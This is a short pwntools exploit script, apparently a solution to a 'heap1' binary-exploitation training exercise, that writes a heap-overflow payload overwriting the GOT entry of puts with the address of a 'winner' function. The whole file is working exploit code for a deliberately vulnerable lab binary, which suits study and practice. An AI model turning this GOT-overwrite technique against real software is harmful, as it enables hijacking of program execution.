from pwn import *

elf = context.binary = ELF("./heap1")


payload = flat(
    b"A" * 20,
    elf.got["puts"],
)

with open("arg1","wb") as f:
    f.write(payload)

with open("arg2","wb") as f:
    f.write(flat(elf.sym["winner"]))

    